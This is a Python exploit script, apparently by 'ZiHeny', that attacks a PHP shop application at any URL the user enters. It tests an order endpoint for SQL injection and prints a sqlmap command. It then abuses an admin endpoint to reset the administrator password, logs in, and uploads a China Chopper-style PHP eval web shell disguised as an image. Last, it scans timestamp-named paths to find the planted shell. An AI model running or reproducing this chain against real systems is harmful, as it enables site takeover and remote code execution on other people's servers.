import time
import requests
import json

#Power By ZiHeny
url = input('Scan URL: ')
print("-----------------------SQLinject-----------------------")
session = requests.Session()
t = time.time()
url2 = url+"/ajax.php?act=create"
adminurl = url + "/admin/ajax.php?act=upAdmin"
gourl = url+"/admin/login.php"
saveurl = url+"/admin/clist.php?my=add_submit"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "X-Requested-With": "XMLHttpRequest"
    }
headers2 = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    }
gooddata = {"number":"1","rel":"1","out_trade_no":"1","gid":"3","money":"1","type":"wx"}
baddata = {"number":"1","rel":"1","out_trade_no":"1'","gid":"3","money":"1","type":"wx"}
admindata = {"u":"admin","p":"67d8e7f21d72f46ba5fae4f9a9b1f498"}
godata = {"user":"admin","pass":"435434234"}
files = {"img":("test.php","<?php @eval($_POST['chopper']);?>","image/jpeg",{'Content-Disposition': 'form-data; name="gname"'})}
r = requests.post(url2,headers=headers,data=gooddata).text
r2 = requests.post(url2,headers=headers,data=baddata).text
r3 = requests.post(adminurl,headers=headers,data=admindata).text
good = len(r)
bad = len(r2)
if good != bad:
    print("python2 sqlmap.py -u " + url2 + ' --data "number=1&rel=1&out_trade_no=1*&gid=3&money=1&type=wx" --random-agent --headers="X-Requested-With:XMLHttpRequest"')
else:
    print("Not SQLinject!!!")
print("-----------------------UserPass Change-----------------------")
if r3.find("成功") != -1:
    print("Succeed    Username:  admin Password:  435434234 后台登录密码")
    print("-----------------------Register-----------------------")
    try:#使用session请求
        r4 = session.post(gourl,headers=headers2,data=godata).text
        if r4.find("成功") != -1:
            print("Login Success")
            print("-----------------------Image Save-----------------------") #开始后台文件上传
            r5 = session.post(saveurl,headers=headers2,files=files).text
            times = int(t)
            for i in range(times,times+150):
                lj = url+"/assets/goodsimg/"+str(i)+".php"
                print(lj)
                if requests.get(lj,headers=headers).status_code != 404:
                    print("webshell上传路径-----------"+lj)
                    break 
        else:
            print("Register Error")
    except:
        print("Cookie Error")
else:
    print("failed!!!")



